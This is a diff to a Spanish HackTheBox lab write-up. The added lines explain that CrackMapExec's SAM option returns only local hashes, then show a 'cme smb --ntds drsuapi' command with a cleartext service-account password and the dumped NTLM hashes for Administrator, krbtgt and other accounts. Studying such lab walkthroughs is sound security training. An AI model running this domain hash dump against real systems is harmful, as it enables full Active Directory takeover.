@@ -905,7 +905,22 @@ ERROR:root:SAM hashes extraction for user WDAGUtilityAccount failed. The account
 SMB         10.10.11.222    445    AUTHORITY        [+] Added 3 SAM hashes to the database
 ```
 
-- Por alguna razón el hash que nos da `crackmapexec` no es correcto pero podemos solicitarlo de otra forma.
+- El hash que nos da `crackmapexec` no es correcto por que al poner `--sam` el hash es el local y no el del AD.
+
+- Para tener los hashes del AD y tener el correcto del administrador debemos usar `--ntds drsuapi`.
+
+```bash
+❯ cme smb 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --ntds drsuapi
+SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
+SMB         10.10.11.222    445    AUTHORITY        [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.10.11.222    445    AUTHORITY        Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
+SMB         10.10.11.222    445    AUTHORITY        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.11.222    445    AUTHORITY        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
+SMB         10.10.11.222    445    AUTHORITY        svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
+SMB         10.10.11.222    445    AUTHORITY        AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:9fe3805afb034743bed6e360c103115e:::
+SMB         10.10.11.222    445    AUTHORITY        [+] Dumped 5 NTDS hashes to /home/miguel/.cme/logs/AUTHORITY_10.10.11.222_2024-07-11_003637.ntds of which 4 were added to the database
+```
 
 - Vamos a usar write_rbcd para darle permisos de `delegration` sobre el DC.
 
